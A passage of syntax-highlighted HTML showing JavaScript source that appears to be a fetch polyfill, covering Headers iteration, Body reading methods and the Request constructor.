punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>values <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    items<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">iteratorFor</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">}</span>Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>entries <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>    items<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>name<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">iteratorFor</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>iterable<span class="token punctuation">)</span> <span class="token punctuation">{</span>  Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>Symbol<span class="token punctuation">.</span>iterator<span class="token punctuation">]</span> <span class="token operator">=</span> Headers<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>entries<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">consumed</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>body<span class="token punctuation">.</span>bodyUsed<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Already read'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  body<span class="token punctuation">.</span>bodyUsed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">fileReaderReady</span><span class="token punctuation">(</span>reader<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span>    reader<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">resolve</span><span class="token punctuation">(</span>reader<span class="token punctuation">.</span>result<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    reader<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">reject</span><span class="token punctuation">(</span>reader<span class="token punctuation">.</span>error<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">readBlobAsArrayBuffer</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> promise <span class="token operator">=</span> <span class="token function">fileReaderReady</span><span class="token punctuation">(</span>reader<span class="token punctuation">)</span>  reader<span class="token punctuation">.</span><span class="token function">readAsArrayBuffer</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>  <span class="token keyword">return</span> promise<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">readBlobAsText</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> promise <span class="token operator">=</span> <span class="token function">fileReaderReady</span><span class="token punctuation">(</span>reader<span class="token punctuation">)</span>  reader<span class="token punctuation">.</span><span class="token function">readAsText</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>  <span class="token keyword">return</span> promise<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">readArrayBufferAsText</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>  <span class="token keyword">var</span> chars <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>view<span class="token punctuation">.</span>length<span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> view<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>view<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> chars<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bufferClone</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">.</span>slice<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> buf<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span>    view<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> view<span class="token punctuation">.</span>buffer  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">Body</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>bodyUsed <span class="token operator">=</span> <span class="token boolean">false</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_initBody <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyInit <span class="token operator">=</span> body    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>body<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyText <span class="token operator">=</span> <span class="token string">''</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> body <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyText <span class="token operator">=</span> body    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>blob <span class="token operator">&amp;&amp;</span> Blob<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">isPrototypeOf</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyBlob <span class="token operator">=</span> body    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>formData <span class="token operator">&amp;&amp;</span> FormData<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">isPrototypeOf</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyFormData <span class="token operator">=</span> body    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>searchParams <span class="token operator">&amp;&amp;</span> URLSearchParams<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">isPrototypeOf</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyText <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>arrayBuffer <span class="token operator">&amp;&amp;</span> support<span class="token punctuation">.</span>blob <span class="token operator">&amp;&amp;</span> <span class="token function">isDataView</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer <span class="token operator">=</span> <span class="token function">bufferClone</span><span class="token punctuation">(</span>body<span class="token punctuation">.</span>buffer<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// IE 10-11 can't handle a DataView body.</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyInit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>arrayBuffer <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ArrayBuffer<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">isPrototypeOf</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isArrayBufferView</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer <span class="token operator">=</span> <span class="token function">bufferClone</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyText <span class="token operator">=</span> body <span class="token operator">=</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> body <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">,</span> <span class="token string">'text/plain;charset=UTF-8'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyBlob <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyBlob<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyBlob<span class="token punctuation">.</span>type<span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>searchParams <span class="token operator">&amp;&amp;</span> URLSearchParams<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">isPrototypeOf</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded;charset=UTF-8'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>blob<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>blob <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> rejected <span class="token operator">=</span> <span class="token function">consumed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>rejected<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> rejected      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyBlob<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyBlob<span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyFormData<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'could not read FormData body as blob'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyText<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>arrayBuffer <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">consumed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token operator">||</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer<span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">blob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>readBlobAsArrayBuffer<span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> rejected <span class="token operator">=</span> <span class="token function">consumed</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>rejected<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> rejected    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyBlob<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token function">readBlobAsText</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyBlob<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token function">readArrayBufferAsText</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyArrayBuffer<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyFormData<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'could not read FormData body as text'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_bodyText<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>support<span class="token punctuation">.</span>formData<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>formData <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>json <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span>parse<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// HTTP methods whose capitalization should be normalized</span><span class="token keyword">var</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'DELETE'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'HEAD'</span><span class="token punctuation">,</span> <span class="token string">'OPTIONS'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token keyword">function</span> <span class="token function">normalizeMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> upcased <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> methods<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>upcased<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> upcased <span class="token punctuation">:</span> method<span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">Request</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> options<span class="token punctuation">)</span> <span class="token punctuation">{</span>  options <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token keyword">var</span> body <span class="token operator">=</span> options<span class="token punctuation">.</span>body  <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token keyword">instanceof</span> <span class="token class-name">Request</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span>bodyUsed<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Already read'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>url <span class="token operator">=</span> input<span class="token punctuation">.</span>url    <span class="token keyword">this</span><span class="token punctuation">.</span>credentials <span class="token operator">=</span> input<span class="token punctuation">.</span>credentials    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>options<span class="token punctuation">.</span>headers<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Headers</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>method <span class="token operator">=</span> input<span class="token punctuation">.</span>method    <span class="token keyword">this</span><span class="token punctuation">.</span>mode <span class="token operator">=</span> input<span class="token punctuation">.</span>mode    <span class="token keyword">this</span><span class="token punctuation">.</span>signal <span class="token operator">=</span> input<span class="token punctuation">.</span>signal    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>body <span class="token operator">&amp;&amp;</span> input<span class="token punctuation">.</span>_bodyInit <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      body <span class="token operator">=</span> input<span class="token punctuation">.</span>_bodyInit      input<span class="token punctuation">.</span>bodyUsed <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>credentials <span class="token operator">=</span> options<span class="token punctuation">.</span>credentials <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>credentials <span class="token operator">||</span> <span class="token string">'same-origin'</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>headers <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>headers<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Headers</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token function">normalizeMethod</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>method <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>method <span class="token operator">||</span> <span class="token string">'GET'</span><span class="token punctuation">)</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>mode <span class="token operator">=</span> options<span class="token punctuation">.</span>mode <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mode <span class="token operator">||</span> <span class="token keyword">null</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>signal <span class="token operator">=</span> options<span class="token punctuation">.</span>signal <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>signal  <span class="token keyword">this</span><span class="token punctuation">.</span>referrer <span class="token operator">=</span> <span class="token keyword">null</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>method <span class="token operator">===</span> <span class="token string">'GET'</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>method <span class="token operator">===</span> <span class="token string">'HEAD'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Body not allowed for GET or HEAD requests'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_initBody</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">}</span>Request<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>clone <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>body<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_bodyInit<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> form <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  body    <span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> split <span class="token operator">=</span> bytes<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>        <span class="token keyword">var</span> name <span class="token operator">=</span> split<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token 